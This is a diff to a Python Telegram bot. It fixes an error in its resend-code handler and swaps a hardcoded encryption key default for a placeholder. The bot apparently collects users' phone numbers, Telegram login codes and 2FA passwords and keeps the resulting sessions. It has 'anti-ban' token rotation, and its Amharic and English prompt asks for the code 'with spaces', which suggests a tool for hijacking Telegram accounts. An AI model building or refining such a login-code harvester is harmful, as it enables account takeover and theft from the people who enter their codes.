@@ -1,5 +1,5 @@
 # bot.py — FINAL FULL MERGE
-# All fixes: one-time API, resend without re-request, encryption, token rotation
+# All fixes: one-time API, resend without re-request, encryption, token rotation, BadRequest fix
 # Amharic + English, anti-ban, session cleanup, Flask health checks
 
 import os
@@ -51,11 +51,10 @@ if not BOT_TOKENS:
     BOT_TOKENS = [BOT_TOKEN]
 
 # ============ ENCRYPTION ============
-ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY", "ED49EE8D6ABABD67CD51EE66B6B52B2F7C35F8BAE9A4F47B118C6AA2244B588A").encode()
+ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY", "change_this_to_32_bytes_xxxxx").encode()
 ENCRYPTION_KEY = hashlib.sha256(ENCRYPTION_KEY).digest()
 
 def encrypt_file(filepath):
-    """Encrypt a session file in-place using AES-256-CBC."""
     if not CRYPTO_AVAILABLE or not os.path.exists(filepath):
         return filepath
     try:
@@ -74,7 +73,6 @@ def encrypt_file(filepath):
         return filepath
 
 def decrypt_file(filepath):
-    """Decrypt an encrypted session file."""
     if not CRYPTO_AVAILABLE or not os.path.exists(filepath):
         return filepath
     try:
@@ -753,9 +751,16 @@ async def phone_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def resend_code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    await query.answer()
     user = query.from_user
 
+    # Prevent re-editing the same message
+    current_text = query.message.text or query.message.caption or ""
+    if "Check your Telegram app" in current_text:
+        await query.answer("📲 Code already resent — check Telegram!", show_alert=False)
+        return ConversationHandler.OTP
+
+    await query.answer()
+    
     engine = context.user_data.get('engine')
     if not engine:
         session = get_session_by_user(user.id)
@@ -771,16 +776,26 @@ async def resend_code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
             return ConversationHandler.END
 
     keyboard = [[InlineKeyboardButton("🔄 Resend Code", callback_data="resend_code")]]
-    await query.edit_message_text(
+    new_text = (
         "📲 *Check your Telegram app — the code is already there.*\n\n"
         "📲 ኮዱ በቴሌግራም ውስጥ ደርሶዎታል።\n\n"
         "Enter the 5-digit code with spaces.\n"
-        "ምሳሌ: `2 1 0 3 2`",
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup(keyboard)
+        "ምሳሌ: `2 1 0 3 2`"
     )
     
-    return OTP
+    try:
+        await query.edit_message_text(
+            new_text,
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    except Exception as e:
+        if "Message is not modified" in str(e):
+            await query.answer("📲 Already showing the prompt.", show_alert=False)
+        else:
+            await query.answer("⚠️ Error, try /start again.", show_alert=True)
+    
+    return ConversationHandler.OTP
 
 async def otp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -1022,7 +1037,8 @@ def run_bot_with_token(token, token_index):
                 TWOFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa_handler)]
             },
             fallbacks=[CommandHandler('cancel', cancel)],
-            per_message=False
+            per_message=False,
+            per_chat=True
         )
 
         application.add_handler(conv_handler)
@@ -1054,9 +1070,8 @@ def run_bots():
         t = threading.Thread(target=run_bot_with_token, args=(token, i), daemon=True)
         t.start()
         threads.append(t)
-        time.sleep(0.5)  # Small delay between bot starts
+        time.sleep(0.5)
     
-    # Keep main thread alive
     while True:
         time.sleep(1)
 
@@ -1071,7 +1086,6 @@ if __name__ == '__main__':
     ╚═══════════════════════════════════════════════════════════════╝
     """)
 
-    # Start Flask in a separate thread
     def run_flask():
         port = int(os.environ.get("PORT", 8080))
         app.run(host='0.0.0.0', port=port)
@@ -1079,5 +1093,4 @@ if __name__ == '__main__':
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
     
-    # Start all bots
     run_bots()
